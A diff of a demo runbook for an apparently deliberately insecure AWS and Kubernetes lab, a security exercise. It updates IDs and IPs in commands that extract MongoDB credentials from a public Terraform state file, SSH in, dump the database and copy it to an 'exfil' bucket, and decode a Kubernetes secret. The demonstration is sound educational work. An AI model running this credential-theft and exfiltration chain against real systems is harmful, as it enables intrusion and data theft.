@@ -66,7 +66,7 @@ Security → Code scanning
 Terminal — three intentional weaknesses, live proof:
 ```bash
 # SSH open to the entire internet
-aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
   --query "SecurityGroups[0].IpPermissions" --output table
 ```
 
@@ -121,18 +121,18 @@ AWS Console → CloudTrail → Event history
 
 Browser — public bucket, no login:
 ```
-https://movie-buddy-tfstate-329153220664.s3.amazonaws.com/
+https://movie-buddy-tfstate-472151629584.s3.amazonaws.com/
 ```
 
 Terminal — extract MongoDB credentials from the public state file:
 ```bash
-aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
+aws s3 cp s3://movie-buddy-tfstate-472151629584/wiz-exercise/terraform.tfstate - \
   | python3 -m json.tool | grep -A3 mongodb_url
 ```
 
 Terminal — SSH into EC2 (open port 22):
 ```bash
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128
 ```
 
 **Inside the EC2 shell** — dump the database:
@@ -147,7 +147,7 @@ mongodump --host localhost --port 27017 \
 tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
 
 aws s3 cp /tmp/movie_buddy_dump.tar.gz \
-  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
+  s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz
 ```
 
 **Exit EC2, back on local terminal** — confirm exfiltration succeeded:
@@ -156,7 +156,7 @@ exit
 ```
 
 ```bash
-aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
+aws s3 ls s3://movie-buddy-tfstate-472151629584/exfil/
 ```
 
 ---
@@ -170,11 +170,11 @@ kubectl exec -it $(kubectl get pod -l app=movie-buddy -o jsonpath='{.items[0].me
 
 ### MongoDB backup proof (if asked, or show proactively during attack path section)
 ```bash
-aws s3 ls s3://movie-buddy-db-backups/
+aws s3 ls s3://movie-buddy-db-backups-472151629584/
 
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /usr/local/bin/backup-mongodb.sh"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /usr/local/bin/backup-mongodb.sh"
 
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /etc/cron.d/mongodb-backup"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /etc/cron.d/mongodb-backup"
 ```
 
 ### Kubernetes secrets proof (if asked how secrets are managed)
@@ -186,8 +186,8 @@ kubectl get secret movie-buddy-secrets -o jsonpath='{.data.anthropic_api_key}' |
 
 ### MongoDB version / OS version proof (if asked to confirm outdated software)
 ```bash
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "mongod --version"
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "lsb_release -a"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "mongod --version"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "lsb_release -a"
 ```
 
 ### Ingress / ALB detail (if asked about HTTPS setup)
@@ -201,9 +201,9 @@ kubectl describe ingress movie-buddy-ingress
 
 - [ ] `kubectl get pods -o wide` — confirm pod is Running, not CrashLoopBackOff
 - [ ] Open https://movie-buddy.app in browser — confirm app responds
-- [ ] `ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "echo ok"` — confirm SSH key + IP still work
+- [ ] `ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "echo ok"` — confirm SSH key + IP still work
 - [ ] Confirm EC2 public IP hasn't changed (instances get a new IP on stop/start, not on reboot)
-- [ ] Clean up previous exfil test file: `aws s3 rm s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz` (so the demo shows a fresh timestamp)
+- [ ] Clean up previous exfil test file: `aws s3 rm s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz` (so the demo shows a fresh timestamp)
 - [ ] Confirm AWS CLI is authenticated on the machine you're presenting from: `aws sts get-caller-identity`
 - [ ] Confirm kubectl context points to the right cluster: `kubectl config current-context`
 - [ ] Have this file (`DEMO_RUNBOOK.md`) open in a separate window/tab, not the one you're sharing — or open in the terminal pane if sharing full screen
